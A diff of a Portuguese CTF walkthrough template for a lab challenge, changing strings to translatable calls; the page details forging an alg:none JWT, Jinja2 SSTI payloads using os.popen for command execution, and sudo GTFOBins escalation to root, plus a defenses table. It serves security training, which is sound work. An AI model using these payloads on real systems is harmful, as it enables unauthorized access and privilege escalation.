@@ -2,7 +2,7 @@
         <i class="nf nf-md-shield_key wt-header-icon" aria-hidden="true"></i>
         <div class="wt-header-info">
           <span class="wt-header-kicker">{{ challenge.category | upper }}</span>
-          <h1 class="wt-title">Bravo — Weak JWT & SSTI: Guia Definitivo</h1>
+          <h1 class="wt-title">{{ _('Bravo — Weak JWT & SSTI: Guia Definitivo') }}</h1>
           <p class="wt-intro">
             Bem-vindo(a) ao segundo desafio oficial da DUNO! Sua missão é invadir o <strong>Corporate Portal</strong> explorando fragilidades na validação de tokens JWT (algoritmo <code>none</code>), executando Server-Side Template Injection (SSTI) no Jinja2 para RCE e escalando privilégios até root via GTFOBins no Linux. Siga o roteiro investigativo abaixo.
           </p>
@@ -14,7 +14,7 @@
       <section class="wt-step" id="step-0" data-step-index="0">
         <div class="wt-step-number">0</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Parte 0 — Entendendo o Terreno Antes de Atacar</h3>
+          <h3 class="wt-step-title">{{ _('Parte 0 — Entendendo o Terreno Antes de Atacar') }}</h3>
           <p>
             O <strong>Corporate Portal</strong> utiliza autenticação baseada em tokens JSON Web Token (JWT) e hospeda um conjunto de ferramentas administrativas internas na porta 5002. A cadeia de ataque é dividida em 3 camadas complementares:
           </p>
@@ -26,10 +26,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-login" aria-hidden="true"></i> Login (/login)
                 </span>
-                <span class="wt-surface-tag tag-recon">Recon & Entrada</span>
+                <span class="wt-surface-tag tag-recon">{{ _('Recon & Entrada') }}</span>
               </div>
               <div class="wt-surface-body">
-                Autentica colaboradores e funcionários no portal corporativo.
+                {{ _('Autentica colaboradores e funcionários no portal corporativo.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-comment_text_outline" aria-hidden="true"></i>
@@ -43,10 +43,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-key" aria-hidden="true"></i> Cookie Token (JWT)
                 </span>
-                <span class="wt-surface-tag tag-jwt">Auth Bypass</span>
+                <span class="wt-surface-tag tag-jwt">{{ _('Auth Bypass') }}</span>
               </div>
               <div class="wt-surface-body">
-                Mantém o estado da sessão stateless gravado diretamente no navegador do usuário.
+                {{ _('Mantém o estado da sessão stateless gravado diretamente no navegador do usuário.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-shield_alert" aria-hidden="true"></i>
@@ -60,10 +60,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-crown" aria-hidden="true"></i> Admin Panel (/admin/panel)
                 </span>
-                <span class="wt-surface-tag tag-admin">FLAG 1</span>
+                <span class="wt-surface-tag tag-admin">{{ _('FLAG 1') }}</span>
               </div>
               <div class="wt-surface-body">
-                Painel de controle interno restrito a contas com papel de administrador.
+                {{ _('Painel de controle interno restrito a contas com papel de administrador.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-fa-flag" aria-hidden="true"></i>
@@ -77,10 +77,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-file_code" aria-hidden="true"></i> Template Editor (/admin/template)
                 </span>
-                <span class="wt-surface-tag tag-ssti">FLAG 2 (SSTI RCE)</span>
+                <span class="wt-surface-tag tag-ssti">{{ _('FLAG 2 (SSTI RCE)') }}</span>
               </div>
               <div class="wt-surface-body">
-                Ferramenta interna de pré-visualização de mensagens e notificações aos funcionários.
+                {{ _('Ferramenta interna de pré-visualização de mensagens e notificações aos funcionários.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-code_tags" aria-hidden="true"></i>
@@ -94,10 +94,10 @@
                 <span class="wt-surface-title">
                   <i class="nf nf-md-shield_crown" aria-hidden="true"></i> Sudoers (GTFOBins)
                 </span>
-                <span class="wt-surface-tag tag-root">FLAG 3 ROOT</span>
+                <span class="wt-surface-tag tag-root">{{ _('FLAG 3 ROOT') }}</span>
               </div>
               <div class="wt-surface-body">
-                Permissões administrativas configuradas para execução com privilégios de superusuário no host Linux.
+                {{ _('Permissões administrativas configuradas para execução com privilégios de superusuário no host Linux.') }}
               </div>
               <div class="wt-surface-vector">
                 <i class="nf nf-md-chevron_double_up" aria-hidden="true"></i>
@@ -115,7 +115,7 @@
               </p>
               <div class="wt-code-block" style="margin-top: 8px;">
                 <div class="wt-code-header">
-                  <span class="wt-code-prompt">Estrutura:</span>
+                  <span class="wt-code-prompt">{{ _('Estrutura:') }}</span>
                   <code>{"alg": "none", "typ": "JWT"} . {"username": "user", "role": "user"} . &lt;assinatura&gt;</code>
                 </div>
               </div>
@@ -129,12 +129,12 @@
       <section class="wt-step" id="step-1" data-step-index="1">
         <div class="wt-step-number">1</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 1 — Reconhecimento e Descoberta de Credenciais</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 1 — Reconhecimento e Descoberta de Credenciais') }}</h3>
           <p>Inicie a máquina pelo card ou botão lateral e acesse o endereço do alvo ativo. Na página de login, inspecione o código-fonte HTML através do DevTools (<code>F12</code>) ou pressionando <code>Ctrl+U</code>.</p>
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Terminal:</span>
+              <span class="wt-code-prompt">{{ _('Terminal:') }}</span>
               <code>curl -s http://10.10.15.12:5002/ | grep -i "TODO" -A 4</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -142,10 +142,10 @@
             </div>
           </div>
 
-          <p>Você encontrará o comentário deixado pela equipe de desenvolvimento:</p>
+          <p>{{ _('Você encontrará o comentário deixado pela equipe de desenvolvimento:') }}</p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Código-Fonte HTML:</span>
+              <span class="wt-code-prompt">{{ _('Código-Fonte HTML:') }}</span>
               <code>&lt;!-- TODO: Remove before production deployment | Dev credentials: user / password123 --&gt;</code>
             </div>
           </div>
@@ -158,19 +158,19 @@
       <section class="wt-step" id="step-2" data-step-index="2">
         <div class="wt-step-number">2</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 2 — Análise e Falsificação de Token JWT (alg: none)</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 2 — Análise e Falsificação de Token JWT (alg: none)') }}</h3>
           <p>
             Após o login, o dashboard exibe o token gravado no cookie <code>token</code>:
           </p>
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Token Original:</span>
+              <span class="wt-code-prompt">{{ _('Token Original:') }}</span>
               <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoidXNlciJ9.</code>
             </div>
           </div>
 
-          <p>Decodificando as seções em Base64URL:</p>
+          <p>{{ _('Decodificando as seções em Base64URL:') }}</p>
           <ul style="margin-bottom: 0.85rem; padding-left: 1.2rem; color: var(--ink-2); font-size: 0.88rem;">
             <li><strong>Header:</strong> <code>{"alg": "none", "typ": "JWT"}</code></li>
             <li><strong>Payload:</strong> <code>{"username": "user", "role": "user"}</code></li>
@@ -183,7 +183,7 @@
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Token Forjado (role: admin):</span>
+              <span class="wt-code-prompt">{{ _('Token Forjado (role: admin):') }}</span>
               <code>eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ.</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Token
@@ -208,9 +208,9 @@
       <section class="wt-step" id="step-3" data-step-index="3">
         <div class="wt-step-number">3</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 3 — Descoberta do Painel Admin e Captura da FLAG 1</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 3 — Descoberta do Painel Admin e Captura da FLAG 1') }}</h3>
           <p>
-            O dashboard confirma o papel de administrador, mas não entrega a flag diretamente. É necessário enumerar endpoints administrativos. Testando caminhos usuais:
+            {{ _('O dashboard confirma o papel de administrador, mas não entrega a flag diretamente. É necessário enumerar endpoints administrativos. Testando caminhos usuais:') }}
           </p>
           <ul style="margin-bottom: 0.85rem; padding-left: 1.2rem; color: var(--ink-2); font-size: 0.88rem;">
             <li><code>/admin</code> → Retorna 404 Not Found</li>
@@ -219,7 +219,7 @@
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Requisição cURL:</span>
+              <span class="wt-code-prompt">{{ _('Requisição cURL:') }}</span>
               <code>curl -s -b "token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InVzZXIiLCJyb2xlIjoiYWRtaW4ifQ." http://10.10.15.12:5002/admin/panel</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -244,7 +244,7 @@
       <section class="wt-step" id="step-4" data-step-index="4">
         <div class="wt-step-number">4</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 4 — Server-Side Template Injection (SSTI) & FLAG 2</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 4 — Server-Side Template Injection (SSTI) & FLAG 2') }}</h3>
           <p>
             No painel de controle administrativo, acesse a ferramenta <strong>Notification Template Editor</strong> em <code>/admin/template</code>. Esta funcionalidade renderiza templates Jinja2 em tempo de execução via <code>render_template_string()</code> sem sanitização.
           </p>
@@ -252,7 +252,7 @@
           <p><strong>Subetapa 4.1 — Confirmando a vulnerabilidade SSTI:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Payload de Verificação:</span>
+              <span class="wt-code-prompt">{{ _('Payload de Verificação:') }}</span>
               <code>{{ 7 * 7 }}</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -266,7 +266,7 @@
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Payload SSTI RCE:</span>
+              <span class="wt-code-prompt">{{ _('Payload SSTI RCE:') }}</span>
               <code>{{request.application.__globals__.__builtins__.__import__('os').popen('cat /app/flag2.txt').read()}}</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Payload
@@ -291,14 +291,14 @@
       <section class="wt-step" id="step-5" data-step-index="5">
         <div class="wt-step-number">5</div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Etapa 5 — Enumeração GTFOBins e Escalada Root (FLAG 3 ROOT)</h3>
+          <h3 class="wt-step-title">{{ _('Etapa 5 — Enumeração GTFOBins e Escalada Root (FLAG 3 ROOT)') }}</h3>
           <p>
             Com execução remota de comandos via SSTI na conta <code>ctfuser</code>, o passo mandatório de pós-exploração Linux é verificar privilégios no arquivo <code>sudoers</code> com <code>sudo -l</code>.
           </p>
 
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Payload Enumeração Sudo:</span>
+              <span class="wt-code-prompt">{{ _('Payload Enumeração Sudo:') }}</span>
               <code>{{request.application.__globals__.__builtins__.__import__('os').popen('sudo -l').read()}}</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy
@@ -306,10 +306,10 @@
             </div>
           </div>
 
-          <p>O retorno do comando expõe a configuração vulnerável:</p>
+          <p>{{ _('O retorno do comando expõe a configuração vulnerável:') }}</p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Retorno de sudo -l:</span>
+              <span class="wt-code-prompt">{{ _('Retorno de sudo -l:') }}</span>
               <code>User ctfuser may run the following commands on bravo: (ALL) NOPASSWD: /usr/bin/env, /usr/bin/python3</code>
             </div>
           </div>
@@ -321,7 +321,7 @@
           <p><strong>Vetor 1 — Exploração via /usr/bin/env:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Payload Final Root (via env):</span>
+              <span class="wt-code-prompt">{{ _('Payload Final Root (via env):') }}</span>
               <code>{{request.application.__globals__.__builtins__.__import__('os').popen('sudo /usr/bin/env /bin/sh -c "cat /root/flag3.txt"').read()}}</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Payload
@@ -332,7 +332,7 @@
           <p><strong>Vetor 2 — Exploração via python3:</strong></p>
           <div class="wt-code-block">
             <div class="wt-code-header">
-              <span class="wt-code-prompt">Payload Alternativo (via python3):</span>
+              <span class="wt-code-prompt">{{ _('Payload Alternativo (via python3):') }}</span>
               <code>{{request.application.__globals__.__builtins__.__import__('os').popen('sudo python3 -c "print(open(\"/root/flag3.txt\").read())"').read()}}</code>
               <button type="button" class="wt-copy-btn">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copy Payload
@@ -357,12 +357,12 @@
       <section class="wt-step" id="step-6" data-step-index="6">
         <div class="wt-step-number"><i class="nf nf-md-lightning_bolt" aria-hidden="true"></i></div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Script Python Automatizado (solve_bravo.py)</h3>
-          <p>Script completo em Python vanilla pronto para executar e extrair todas as 3 flags do desafio Bravo em sequência:</p>
+          <h3 class="wt-step-title">{{ _('Script Python Automatizado (solve_bravo.py)') }}</h3>
+          <p>{{ _('Script completo em Python vanilla pronto para executar e extrair todas as 3 flags do desafio Bravo em sequência:') }}</p>
 
           <div class="wt-code-block">
             <div class="wt-code-header" style="justify-content: space-between;">
-              <span class="wt-code-prompt">Python 3 (solve_bravo.py):</span>
+              <span class="wt-code-prompt">{{ _('Python 3 (solve_bravo.py):') }}</span>
               <button type="button" class="wt-copy-btn" id="btn-copy-solve-script">
                 <i class="nf nf-md-content_copy" aria-hidden="true"></i> Copiar Script Completo
               </button>
@@ -432,37 +432,37 @@ print("[+] Desafio Bravo 100% concluído!")</code></pre>
       <section class="wt-step" id="step-7" data-step-index="7">
         <div class="wt-step-number"><i class="nf nf-md-book_open_page_variant" aria-hidden="true"></i></div>
         <div class="wt-step-content">
-          <h3 class="wt-step-title">Dicionário do Pentester & Melhores Práticas</h3>
-          <p>Conceitos fundamentais aplicados nesta exploração:</p>
+          <h3 class="wt-step-title">{{ _('Dicionário do Pentester & Melhores Práticas') }}</h3>
+          <p>{{ _('Conceitos fundamentais aplicados nesta exploração:') }}</p>
 
           <div class="wt-table-wrap">
             <table class="wt-clean-table">
               <thead>
                 <tr>
-                  <th>Termo</th>
-                  <th>Conceito</th>
-                  <th>Defesa Recomendada</th>
+                  <th>{{ _('Termo') }}</th>
+                  <th>{{ _('Conceito') }}</th>
+                  <th>{{ _('Defesa Recomendada') }}</th>
                 </tr>
               </thead>
               <tbody>
                 <tr>
                   <td><code>JSON Web Token (JWT)</code></td>
-                  <td>Padrão aberto (RFC 7519) para transmissão compacta e segura de dados entre partes</td>
-                  <td>Utilizar bibliotecas robustas e chaves assimétricas fortes (RS256)</td>
+                  <td>{{ _('Padrão aberto (RFC 7519) para transmissão compacta e segura de dados entre partes') }}</td>
+                  <td>{{ _('Utilizar bibliotecas robustas e chaves assimétricas fortes (RS256)') }}</td>
                 </tr>
                 <tr>
                   <td><code>alg: "none"</code></td>
-                  <td>Algoritmo que instrui o backend a dispensar a validação de assinatura criptográfica</td>
+                  <td>{{ _('Algoritmo que instrui o backend a dispensar a validação de assinatura criptográfica') }}</td>
                   <td>Rejeitar explicitamente tokens com <code>alg: none</code> no middleware de autenticação</td>
                 </tr>
                 <tr>
                   <td><code>SSTI</code></td>
-                  <td>Injeção em Template Engines quando inputs do usuário são avaliados como código</td>
+                  <td>{{ _('Injeção em Template Engines quando inputs do usuário são avaliados como código') }}</td>
                   <td>Nunca passar variáveis de usuário para <code>render_template_string</code> sem contexto seguro</td>
                 </tr>
                 <tr>
                   <td><code>GTFOBins</code></td>
-                  <td>Curadoria de binários Unix legítimos exploráveis para contornar restrições de segurança</td>
+                  <td>{{ _('Curadoria de binários Unix legítimos exploráveis para contornar restrições de segurança') }}</td>
                   <td>Nunca conceder privilégios no <code>sudoers</code> a binários com capacidade de execução de shell</td>
                 </tr>
               </tbody>
